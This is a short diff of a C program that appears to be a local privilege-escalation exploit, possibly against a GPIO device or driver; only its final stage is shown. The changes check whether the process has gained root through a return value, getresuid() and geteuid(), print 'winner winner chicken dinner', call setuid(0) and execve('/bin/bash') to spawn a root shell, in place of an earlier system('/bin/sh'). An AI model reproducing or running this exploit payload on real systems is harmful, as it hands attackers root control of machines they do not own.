@@ -96,19 +96,39 @@ GPIO_CLR = 1 << 4;
       z++;
     }
   }
+  uid_t id0,id1,id2;
+
   printf("%d\n",z);
   if(ret == 0)
   {
-    printf("winner winner chicken dinner");
+    printf("winner winner chicken dinner (return)");
     fflush(stdout);
-    system("/bin/sh");
+    getresuid(&id0,&id1,&id2);
+    fflush(stdout);
+    printf("gri:%d/%d/%d",id0,id1,id2);
+    setuid(0);
+    execve("/bin/bash",0,0);
+    // system("/bin/sh");
   }
+
+
+  getresuid(&id0,&id1,&id2);
+  if(id0 == 0 || id1 == 0 || id2 == 0)
+  {
+    printf("winner winner chicken dinner (getresuid)");
+    fflush(stdout);
+    setuid(0);
+    execve("/bin/bash",0,0);
+  }
+
+  printf("gri:%d/%d/%d",id0,id1,id2);
 
   if(geteuid() == 0)
   {
-    printf("winner winner chicken dinner");
+    printf("winner winner chicken dinner (geteuid)");
     fflush(stdout);
-    system("/bin/sh");
+    setuid(0);
+    execve("/bin/bash",0,0);
   }
 
   return 0;
